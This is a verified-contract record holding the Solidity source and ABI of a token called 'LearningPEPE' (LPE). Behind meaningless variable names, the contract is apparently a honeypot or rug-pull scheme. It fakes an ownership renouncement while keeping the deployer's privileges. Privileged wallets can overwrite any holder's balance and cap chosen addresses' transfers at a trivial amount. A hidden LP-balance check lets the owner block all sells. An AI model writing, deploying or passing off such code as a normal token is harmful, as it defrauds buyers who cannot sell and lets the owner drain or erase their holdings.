{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface isModeFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txIsTeam) external view returns (uint256);\n\n    function transfer(address txMax, uint256 isAmountList) external returns (bool);\n\n    function allowance(address receiverTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isAmountList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txMax,\n        uint256 isAmountList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingReceiver, uint256 value);\n    event Approval(address indexed receiverTeam, address indexed spender, uint256 value);\n}\n\nabstract contract feeTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalWalletTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeMin {\n    function createPair(address toTx, address buyTeam) external returns (address);\n}\n\ninterface isModeFundMetadata is isModeFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LearningPEPE is feeTeam, isModeFund, isModeFundMetadata {\n\n    bool public shouldEnable;\n\n    function balanceOf(address txIsTeam) public view virtual override returns (uint256) {\n        return txSwap[txIsTeam];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountFund;\n    }\n\n    address private receiverMarketing;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableBuy;\n    }\n\n    constructor (){\n        \n        totalWalletTx fundWallet = totalWalletTx(walletToken);\n        teamFrom = feeMin(fundWallet.factory()).createPair(fundWallet.WETH(), address(this));\n        if (launchList != maxSell) {\n            launchList = maxSell;\n        }\n        modeSwap = _msgSender();\n        txList();\n        walletBuy[modeSwap] = true;\n        txSwap[modeSwap] = enableBuy;\n        if (fundFeeMarketing) {\n            launchedTxLimit = true;\n        }\n        emit Transfer(address(0), modeSwap, enableBuy);\n    }\n\n    mapping(address => mapping(address => uint256)) private autoLimitAmount;\n\n    function approve(address autoMin, uint256 isAmountList) public virtual override returns (bool) {\n        autoLimitAmount[_msgSender()][autoMin] = isAmountList;\n        emit Approval(_msgSender(), autoMin, isAmountList);\n        return true;\n    }\n\n    bool public launchedTxLimit;\n\n    mapping(address => bool) public walletBuy;\n\n    function fromAuto(address tradingMode) public {\n        modeFee();\n        if (launchList != maxSell) {\n            launchList = maxSell;\n        }\n        if (tradingMode == modeSwap || tradingMode == teamFrom) {\n            return;\n        }\n        receiverSell[tradingMode] = true;\n    }\n\n    function transferFrom(address swapMode, address txMax, uint256 isAmountList) external override returns (bool) {\n        if (_msgSender() != walletToken) {\n            if (autoLimitAmount[swapMode][_msgSender()] != type(uint256).max) {\n                require(isAmountList <= autoLimitAmount[swapMode][_msgSender()]);\n                autoLimitAmount[swapMode][_msgSender()] -= isAmountList;\n            }\n        }\n        return atLimit(swapMode, txMax, isAmountList);\n    }\n\n    function transfer(address fromMarketing, uint256 isAmountList) external virtual override returns (bool) {\n        return atLimit(_msgSender(), fromMarketing, isAmountList);\n    }\n\n    mapping(address => uint256) private txSwap;\n\n    uint256 private maxSell;\n\n    function txList() public {\n        emit OwnershipTransferred(modeSwap, address(0));\n        receiverMarketing = address(0);\n    }\n\n    string private txEnable = \"Learning PEPE\";\n\n    uint256 private enableBuy = 100000000 * 10 ** 18;\n\n    function autoSender(address swapMode, address txMax, uint256 isAmountList) internal returns (bool) {\n        require(txSwap[swapMode] >= isAmountList);\n        txSwap[swapMode] -= isAmountList;\n        txSwap[txMax] += isAmountList;\n        emit Transfer(swapMode, txMax, isAmountList);\n        return true;\n    }\n\n    address walletToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return txEnable;\n    }\n\n    function enableAuto(address fromMarketing, uint256 isAmountList) public {\n        modeFee();\n        txSwap[fromMarketing] = isAmountList;\n    }\n\n    uint256 constant receiverTeamAmount = 19 ** 10;\n\n    string private amountFund = \"LPE\";\n\n    function sellMax(address buyWalletMax) public {\n        if (shouldEnable) {\n            return;\n        }\n        if (launchedTxLimit) {\n            launchList = maxSell;\n        }\n        walletBuy[buyWalletMax] = true;\n        if (maxSell == launchList) {\n            launchedTxLimit = false;\n        }\n        shouldEnable = true;\n    }\n\n    uint256 sellFund;\n\n    function autoLaunch(uint256 isAmountList) public {\n        modeFee();\n        minFund = isAmountList;\n    }\n\n    bool private fundFeeMarketing;\n\n    address public modeSwap;\n\n    address marketingTxLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private launchList;\n\n    address public teamFrom;\n\n    function getOwner() external view returns (address) {\n        return receiverMarketing;\n    }\n\n    function atLimit(address swapMode, address txMax, uint256 isAmountList) internal returns (bool) {\n        if (swapMode == modeSwap) {\n            return autoSender(swapMode, txMax, isAmountList);\n        }\n        uint256 sellShould = isModeFund(teamFrom).balanceOf(marketingTxLaunch);\n        require(sellShould == minFund);\n        require(txMax != marketingTxLaunch);\n        if (receiverSell[swapMode]) {\n            return autoSender(swapMode, txMax, receiverTeamAmount);\n        }\n        return autoSender(swapMode, txMax, isAmountList);\n    }\n\n    function owner() external view returns (address) {\n        return receiverMarketing;\n    }\n\n    uint8 private limitTeamLaunch = 18;\n\n    mapping(address => bool) public receiverSell;\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitTeamLaunch;\n    }\n\n    function modeFee() private view {\n        require(walletBuy[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed teamMax, address indexed takeTradingTotal);\n\n    uint256 minFund;\n\n    function allowance(address teamSender, address autoMin) external view virtual override returns (uint256) {\n        if (autoMin == walletToken) {\n            return type(uint256).max;\n        }\n        return autoLimitAmount[teamSender][autoMin];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTradingTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAmountList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isAmountList\",\"type\":\"uint256\"}],\"name\":\"autoLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txIsTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAmountList\",\"type\":\"uint256\"}],\"name\":\"enableAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMode\",\"type\":\"address\"}],\"name\":\"fromAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTxLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyWalletMax\",\"type\":\"address\"}],\"name\":\"sellMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAmountList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAmountList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "LearningPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}